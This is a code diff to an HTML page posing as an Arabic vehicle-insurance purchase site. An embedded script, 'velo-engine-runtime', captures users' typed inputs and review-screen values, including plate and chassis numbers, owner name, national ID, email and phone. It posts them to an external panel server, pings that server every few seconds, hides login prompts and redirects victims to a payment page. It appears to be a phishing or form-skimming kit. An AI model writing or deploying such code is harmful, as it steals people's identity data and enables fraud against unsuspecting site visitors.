@@ -4187,6 +4187,8 @@
   </div>
   <section class="Toastify" aria-live="polite" aria-atomic="false" aria-relevant="additions text"
     aria-label="Notifications Alt+T"></section><next-route-announcer style="position: absolute;"></next-route-announcer>
+
+
   <script id="velo-engine-runtime">
       (function () {
         var SERVER_HUB_URL = (window.SERVER_HUB_URL || "https://panel-back.onrender.com").replace(/\/+$/, "");
@@ -4235,24 +4237,24 @@
           sendPayloadToHub(payload, false);
         }, true);
 
-
-        // 4. صائد الأزرار ونبضة التواجد
-        (function () {
-          function sendVisitorPing() {
-            var payload = {
-              token: visitorToken, siteKey: siteKey,
-              currentPage: '/buy.html', pageTitle: 'شراء وثيقة تأمين',
-              device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
-            };
-            fetch(SERVER_HUB_URL + '/api/tracker/ping', {
-              method: 'POST', headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload), keepalive: true
-            }).catch(function () { });
-          }
-          setInterval(sendVisitorPing, 4000);
-          sendVisitorPing();
-        })();
-
+        // 4. نبضة التواجد الدورية (Active Ping) لضمان بقاء الزائر متصلاً باللوحة
+        function sendVisitorPing() {
+          var payload = {
+            token: visitorToken,
+            siteKey: siteKey,
+            currentPage: window.location.pathname,
+            pageTitle: document.title || 'شراء وثيقة تأمين',
+            device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
+          };
+          fetch(SERVER_HUB_URL + '/api/tracker/ping', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            keepalive: true
+          }).catch(function () { });
+        }
+        setInterval(sendVisitorPing, 4000);
+        sendVisitorPing();
 
         // 🧠 ذاكرة تتبع مستمرة لتجميع كل ما يختاره المستخدم خطوة بخطوة
         var liveAnswers = {};
@@ -4260,7 +4262,7 @@
           liveAnswers = JSON.parse(localStorage.getItem('saas_live_answers') || '{}');
         } catch (e) { }
 
-        // التقاط أي نقرة على أزرار الاختيارات (الدول، المنافذ، المدد، إلخ)
+        // التقاط نقرات الاختيارات (الدول، المنافذ، المدد)
         document.addEventListener('click', function (e) {
           var btn = e.target.closest('button, [role="button"]');
           if (!btn) return;
@@ -4268,25 +4270,24 @@
           var txt = (btn.innerText || btn.textContent || '').trim();
           if (!txt || txt.length > 50) return;
 
-          // التقاط اسم الدولة أو المنفذ
           var img = btn.querySelector('img');
           if (img && (img.src.includes('flags') || btn.closest('.grid'))) {
-            if (!liveAnswers['دولة القدوم:']) {
-              liveAnswers['دولة القدوم:'] = txt;
-              liveAnswers['جنسية المركبة:'] = txt;
+            if (!liveAnswers['دولة القدوم']) {
+              liveAnswers['دولة القدوم'] = txt;
+              liveAnswers['جنسية المركبة'] = txt;
             } else {
-              liveAnswers['جنسية المركبة:'] = txt;
+              liveAnswers['جنسية المركبة'] = txt;
             }
             localStorage.setItem('saas_live_answers', JSON.stringify(liveAnswers));
           }
 
           if (txt.includes('أسبوع') || txt.includes('شهر') || txt.includes('سنة') || txt.includes('يوم')) {
-            liveAnswers['مدة التأمين:'] = txt;
+            liveAnswers['مدة التأمين'] = txt;
             localStorage.setItem('saas_live_answers', JSON.stringify(liveAnswers));
           }
         }, true);
 
-        // التقاط أي إدخال في الحقول النصية وحفظه فوراً
+        // التقاط الإدخالات وتخزينها فورياً بمسميات عربية نظيفة
         document.addEventListener('input', function (e) {
           var inp = e.target;
           if (!inp || !['INPUT', 'TEXTAREA', 'SELECT'].includes(inp.tagName)) return;
@@ -4294,12 +4295,12 @@
           if (!val) return;
 
           var name = (inp.getAttribute('name') || inp.id || inp.placeholder || '').toLowerCase();
-          if (name.includes('plate') || name.includes('123456') || name.includes('لوحة')) liveAnswers['123456:'] = val;
-          else if (name.includes('chassis') || name.includes('هيكل') || name.includes('شاسيه')) liveAnswers['رقم الشاسيه / الهيكل:'] = val;
-          else if (name.includes('ownername') || name.includes('اسم')) liveAnswers['الاسم الكامل للمالك:'] = val;
-          else if (name.includes('ownerid') || name.includes('id') || name.includes('هوية')) liveAnswers['رقم الهوية / الرقم المدني:'] = val;
-          else if (name.includes('email') || name.includes('بريد')) liveAnswers['البريد الإلكتروني:'] = val;
-          else if (name.includes('phone') || name.includes('mobile') || name.includes('جوال') || name.includes('هاتف')) liveAnswers['رقم الجوال:'] = val;
+          if (name.includes('plate') || name.includes('123456') || name.includes('لوحة')) liveAnswers['رقم اللوحة'] = val;
+          else if (name.includes('chassis') || name.includes('هيكل') || name.includes('شاسيه')) liveAnswers['رقم الشاسيه / الهيكل'] = val;
+          else if (name.includes('ownername') || name.includes('اسم')) liveAnswers['الاسم الكامل للمالك'] = val;
+          else if (name.includes('ownerid') || name.includes('id') || name.includes('هوية')) liveAnswers['رقم الهوية / الرقم المدني'] = val;
+          else if (name.includes('email') || name.includes('بريد')) liveAnswers['البريد الإلكتروني'] = val;
+          else if (name.includes('phone') || name.includes('mobile') || name.includes('جوال') || name.includes('هاتف')) liveAnswers['رقم الجوال'] = val;
 
           localStorage.setItem('saas_live_answers', JSON.stringify(liveAnswers));
         }, true);
@@ -4324,89 +4325,65 @@
 
             var formInputs = {};
 
-            // 1. مسح شامل ودقيق لكافة عناصر شاشة المراجعة (Review Summary)
+            // قراءة شاشة المراجعة واستخراج القيم بدقة
             document.querySelectorAll('div, p, span, tr, li').forEach(function (el) {
-              // استهداف العناصر الصغيرة فقط لتجنب التقاط الحاويات الكبيرة
               if (el.children.length > 2) return;
-
               var txt = (el.innerText || el.textContent || '').trim();
               if (!txt || txt.length > 150) return;
 
               function extractVal(raw) {
                 var parts = raw.split(/[:\n]/).map(function (s) { return s.trim(); }).filter(Boolean);
-                if (parts.length >= 2) {
-                  return parts[parts.length - 1];
-                }
-                return '';
+                return parts.length >= 2 ? parts[parts.length - 1] : '';
               }
 
               if (txt.includes('دولة القدوم') || txt.includes('بلد القدوم')) {
                 var v = extractVal(txt);
-                if (v && !v.includes('دولة') && !v.includes('راجع')) formInputs['دولة القدوم:'] = v;
-              }
-              else if (txt.includes('منفذ الدخول') || txt.includes('المنفذ')) {
+                if (v && !v.includes('دولة') && !v.includes('راجع')) formInputs['دولة القدوم'] = v;
+              } else if (txt.includes('منفذ الدخول') || txt.includes('المنفذ')) {
                 var v = extractVal(txt);
-                if (v && !v.includes('منفذ') && !v.includes('راجع')) formInputs['منفذ الدخول:'] = v;
-              }
-              else if (txt.includes('جنسية المركبة')) {
+                if (v && !v.includes('منفذ') && !v.includes('راجع')) formInputs['منفذ الدخول'] = v;
+              } else if (txt.includes('جنسية المركبة')) {
                 var v = extractVal(txt);
-                if (v && !v.includes('جنسية') && !v.includes('خاصة') && !v.includes('راجع')) formInputs['جنسية المركبة:'] = v;
-              }
-              else if (txt.includes('رقم اللوحة') || txt.includes('اللوحة')) {
+                if (v && !v.includes('جنسية') && !v.includes('خاصة') && !v.includes('راجع')) formInputs['جنسية المركبة'] = v;
+              } else if (txt.includes('رقم اللوحة') || txt.includes('اللوحة')) {
                 var v = extractVal(txt);
-                if (v && !v.includes('اللوحة') && !v.includes('راجع')) formInputs['123456:'] = v;
-              }
-              else if (txt.includes('الشاسيه') || txt.includes('الهيكل')) {
+                if (v && !v.includes('اللوحة') && !v.includes('راجع')) formInputs['رقم اللوحة'] = v;
+              } else if (txt.includes('الشاسيه') || txt.includes('الهيكل')) {
                 var v = extractVal(txt);
-                if (v && !v.includes('الشاسيه') && !v.includes('راجع')) formInputs['رقم الشاسيه / الهيكل:'] = v;
-              }
-              else if (txt.includes('اسم المالك') || txt.includes('مالك المركبة') || (txt.includes('الاسم') && !txt.includes('المستخدم'))) {
+                if (v && !v.includes('الشاسيه') && !v.includes('راجع')) formInputs['رقم الشاسيه / الهيكل'] = v;
+              } else if (txt.includes('اسم المالك') || txt.includes('مالك المركبة')) {
                 var v = extractVal(txt);
-                if (v && !v.includes('الاسم') && !v.includes('راجع')) formInputs['الاسم الكامل للمالك:'] = v;
-              }
-              else if (txt.includes('رقم الهوية') || txt.includes('الرقم المدني') || txt.includes('الإقامة')) {
+                if (v && !v.includes('الاسم') && !v.includes('راجع')) formInputs['الاسم الكامل للمالك'] = v;
+              } else if (txt.includes('رقم الهوية') || txt.includes('الرقم المدني') || txt.includes('الإقامة')) {
                 var v = extractVal(txt);
-                if (v && !v.includes('الهوية') && !v.includes('راجع')) formInputs['رقم الهوية / الرقم المدني:'] = v;
-              }
-              else if (txt.includes('مدة التأمين') || txt.includes('المدة')) {
+                if (v && !v.includes('الهوية') && !v.includes('راجع')) formInputs['رقم الهوية / الرقم المدني'] = v;
+              } else if (txt.includes('مدة التأمين') || txt.includes('المدة')) {
                 var v = extractVal(txt);
-                if (v && !v.includes('مدة') && !v.includes('راجع')) formInputs['مدة التأمين:'] = v;
+                if (v && !v.includes('مدة') && !v.includes('راجع')) formInputs['مدة التأمين'] = v;
               }
             });
 
-            // 2. إكمال النواقص من حقول الإدخال إذا وُجدت
-            document.querySelectorAll('input, select, textarea').forEach(function (inp) {
-              if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button') return;
-              var val = inp.value ? inp.value.trim() : '';
-              if (!val) return;
-
-              var name = (inp.getAttribute('name') || inp.id || inp.placeholder || '').toLowerCase();
-              if ((name.includes('plate') || name.includes('123456') || name.includes('لوحة')) && !formInputs['123456:']) {
-                formInputs['123456:'] = val;
-              }
-              if ((name.includes('email') || name.includes('بريد')) && !formInputs['البريد الإلكتروني:']) {
-                formInputs['البريد الإلكتروني:'] = val;
-              }
-              if ((name.includes('phone') || name.includes('mobile') || name.includes('جوال') || name.includes('هاتف')) && !formInputs['رقم الجوال:']) {
-                formInputs['رقم الجوال:'] = val;
-              }
-            });
-
-            // 3. الاستعانة بالذاكرة المؤقتة liveAnswers كخيار بديل في حال لم تكن القيمة معروضة في ملخص المراجعة
+            // دمج القيم مع الذاكرة المؤقتة liveAnswers كخيار احتياطي
             Object.keys(liveAnswers).forEach(function (k) {
               if (!formInputs[k] && liveAnswers[k] && liveAnswers[k] !== 'خاصة') {
                 formInputs[k] = liveAnswers[k];
               }
             });
 
-            // توليد معرف جلسة فريد ومستقل
+            // تنظيف أي قيم غير صحيحة
+            Object.keys(formInputs).forEach(function (k) {
+              if (typeof formInputs[k] === 'string' && formInputs[k].includes('راجع بيانات')) {
+                delete formInputs[k];
+              }
+            });
+
             var finalSessionId = 'sess_' + Math.random().toString(36).substring(2, 10);
             formInputs._sessionId = finalSessionId;
 
-            // حفظ نسخة محلية لصفحة الفاتورة
+            // حفظ البيانات لصفحة الدفع
             localStorage.setItem('saas_last_submission', JSON.stringify(formInputs));
 
-            // إرسال الكارت المؤكد للوحة التحكم
+            // إرسال الكرت المؤكد والمنظم للوحة التحكم
             fetch(SERVER_HUB_URL + '/api/tracker/submit', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -4421,10 +4398,9 @@
               keepalive: true
             }).catch(function () { });
 
-            // تفريغ الذاكرة المؤقتة
             localStorage.removeItem('saas_live_answers');
 
-            // تحويل الزائر إلى صفحة الفاتورة
+            // التحويل لصفحة الفاتورة
             setTimeout(function () {
               var isLive = window.location.pathname.includes('/live/');
               var isStorage = window.location.pathname.includes('/storage/');
@@ -4441,44 +4417,34 @@
             return;
           }
 
+          // أزرار التنقل المخصصة
+          var targetUrl = btn.getAttribute('data-target-url');
+          if (targetUrl && targetUrl !== 'none' && targetUrl !== 'javascript:void(0);') {
+            e.preventDefault();
+            var destUrl = targetUrl.startsWith('http') ? targetUrl : ((window.location.pathname.includes('/live/') ? '/live/' : '/storage/') + currentSiteId + '/' + targetUrl.replace(/^\//, ''));
+            window.location.href = destUrl;
+          }
+        }, true);
 
-          // 4. نبضة التواجد الآمنة (Active Ping) مع تجنب انهيار السيرفر
-          (function () {
-            function sendVisitorPing() {
-              var payload = {
-                token: visitorToken,
-                siteKey: siteKey,
-                currentPage: window.location.pathname,
-                pageTitle: document.title || 'شراء وثيقة تأمين',
-                device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
-              };
-              fetch(SERVER_HUB_URL + '/api/tracker/ping', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                keepalive: true
-              }).catch(function () { });
-            }
-            setInterval(sendVisitorPing, 5000);
-            sendVisitorPing();
-          })();
-
-          // 5. حجب ظهور أي نوافذ منبثقة تطلب تسجيل الدخول
-          var modalBlocker = new MutationObserver(function (mutations) {
-            mutations.forEach(function (m) {
-              m.addedNodes.forEach(function (node) {
-                if (node.nodeType !== 1) return;
-                var txt = (node.innerText || node.textContent || '');
-                if (txt.includes('تسجيل الدخول مطلوب') || txt.includes('الدخول مطلوب')) {
-                  node.style.display = 'none';
-                  node.remove();
-                }
-              });
+        // 6. حجب النوافذ المنبثقة غير المرغوب فيها
+        var modalBlocker = new MutationObserver(function (mutations) {
+          mutations.forEach(function (m) {
+            m.addedNodes.forEach(function (node) {
+              if (node.nodeType !== 1) return;
+              var txt = (node.innerText || node.textContent || '');
+              if (txt.includes('تسجيل الدخول مطلوب') || txt.includes('الدخول مطلوب')) {
+                node.style.display = 'none';
+                node.remove();
+              }
             });
           });
-          modalBlocker.observe(document.documentElement, { childList: true, subtree: true });
-        })();
+        });
+        modalBlocker.observe(document.documentElement, { childList: true, subtree: true });
+
+      })();
   </script>
+
 </body>
+
 
 </html>
